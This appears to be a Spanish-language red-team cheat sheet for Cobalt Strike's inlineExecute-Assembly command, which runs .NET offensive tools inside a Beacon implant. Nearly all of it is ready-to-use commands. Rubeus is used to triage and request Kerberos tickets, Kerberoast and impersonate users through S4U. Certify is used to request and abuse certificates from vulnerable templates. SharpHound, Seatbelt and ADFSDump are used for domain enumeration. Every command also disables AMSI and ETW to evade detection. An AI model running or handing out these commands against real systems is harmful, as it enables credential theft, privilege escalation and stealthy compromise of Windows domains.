```powershell
# Inline (.NET) Execution con InlineExecute-Assembly

# ==================================
# InlineExecute-Assembly permite cargar y ejecutar ensamblados .NET directamente en el proceso de Beacon sin necesidad de fork and run.
# Esto elimina la creación de procesos adicionales y reduce la superficie de detección, aunque aún puede generar eventos sospechosos al cargar el CLR.
# ==================================

# ----------- Cargar el módulo -----------
# El archivo CNA se encuentra en: C:\Tools\InlineExecute-Assembly

beacon> help inlineExecute-Assembly
# Descripción del comando:
# inlineExecute-Assembly --dotnetassembly /ruta/al/Assembly.exe --assemblyargs "Argumentos" --amsi --etw [opciones adicionales]

# ----------- Ejemplos prácticos -----------

# ==================================
# ----------- Rubeus -----------
# ==================================
# Listar tickets Kerberos del usuario actual
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs triage --amsi --etw

# Solicitar tickets Kerberos para un usuario específico
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs "asktgt /user:username /domain:domain /rc4:hash" --amsi --etw

# Enumerar SPNs para ataques Kerberoasting
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs "kerberoast /outfile:kerberos_hashes.txt" --amsi --etw

# Solicitar S4U2Self y S4U2Proxy
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs "s4u /user:username /impersonateuser:targetuser /msdsspn:cifs/server.domain" --amsi --etw

# ==================================
# ----------- Certify -----------
# ==================================
# Enumerar plantillas de certificados en el dominio
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Certify\Certify\bin\Release\Certify.exe --assemblyargs "find /domain:domain.local" --amsi --etw

# Solicitar un certificado basado en plantillas vulnerables
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Certify\Certify\bin\Release\Certify.exe --assemblyargs "request /template:vulnerableTemplate /altname:user@domain.local" --amsi --etw

# Realizar abuso de privilegios en servicios de certificados
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Certify\Certify\bin\Release\Certify.exe --assemblyargs "abuse /ca:domain-CA /template:vulnerableTemplate" --amsi --etw

# ==================================
# ----------- SharpHound -----------
# ==================================
# Recolectar datos para BloodHound
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\SharpHound\SharpHound.exe --assemblyargs "-c All -d domain.local -v" --amsi --etw

# ==================================
# ----------- Seatbelt -----------
# ==================================
# Enumerar configuraciones de seguridad del sistema
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Seatbelt\Seatbelt.exe --assemblyargs "all" --amsi --etw

# ==================================
# ----------- GhostPack ADFS -----------
# ==================================
# Enumerar ADFS endpoints
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\ADFSDump\ADFSDump.exe --assemblyargs "dump" --amsi --etw

# ==================================
# ----------- Opciones avanzadas -----------
# ==================================
# Cambiar el AppDomain y el Pipe
beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs triage --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337

# ==================================
# Nota:
# ==================================
# - `--amsi`: Deshabilitar AMSI (Anti-Malware Scan Interface) durante la ejecución.
# - `--etw`: Deshabilitar ETW (Event Tracing for Windows) para reducir la detección.
# - La carga del CLR en el proceso puede generar eventos sospechosos dependiendo del contexto y del proceso utilizado por Beacon.



